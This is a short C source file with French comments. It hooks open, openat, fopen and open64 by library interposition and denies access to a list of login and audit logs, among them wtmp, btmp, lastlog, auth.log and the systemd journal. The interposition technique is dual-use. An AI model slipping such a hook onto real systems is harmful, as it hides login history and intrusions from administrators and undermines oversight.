#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <syslog.h>
#include <unistd.h>

// Liste des chemins ou motifs à bloquer
static const char *BLOCKED_PATTERNS[] = {
    "/var/log/wtmp",
    "/var/log/lastlog",
    "/var/log/btmp",
    "/var/log/sysstat",
    "/var/log/journal",
    "Xorg.",
    "/var/log/auth.log",
    NULL
};

// Vérifie si le chemin contient un motif bloqué
static int is_blocked_path(const char *path) {
    if (!path)
        return 0;
    for (int i = 0; BLOCKED_PATTERNS[i] != NULL; i++) {
        if (strstr(path, BLOCKED_PATTERNS[i]) != NULL) {
            syslog(LOG_WARNING, "Blocage de l'accès à %s", path);
            return 1;
        }
    }
    return 0;
}

// Interception de open()
int open(const char *pathname, int flags, ...) {
    static int (*real_open)(const char *, int, mode_t) = NULL;
    if (!real_open) {
        real_open = dlsym(RTLD_NEXT, "open");
    }

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = (flags & O_CREAT) ? va_arg(args, mode_t) : 0;
    va_end(args);
    return real_open(pathname, flags, mode);
}

// Interception de openat()
int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*real_openat)(int, const char *, int, mode_t) = NULL;
    if (!real_openat) {
        real_openat = dlsym(RTLD_NEXT, "openat");
    }

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = (flags & O_CREAT) ? va_arg(args, mode_t) : 0;
    va_end(args);
    return real_openat(dirfd, pathname, flags, mode);
}

// Interception de fopen()
FILE *fopen(const char *pathname, const char *mode) {
    static FILE* (*real_fopen)(const char *, const char *) = NULL;
    if (!real_fopen) {
        real_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return NULL;
    }
    return real_fopen(pathname, mode);
}

// Interception de open64()
int open64(const char *pathname, int flags, ...) {
    static int (*real_open64)(const char *, int, mode_t) = NULL;
    if (!real_open64) {
        real_open64 = dlsym(RTLD_NEXT, "open64");
    }

    if (is_blocked_path(pathname)) {
        errno = EACCES;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = (flags & O_CREAT) ? va_arg(args, mode_t) : 0;
    va_end(args);
    return real_open64(pathname, flags, mode);
}

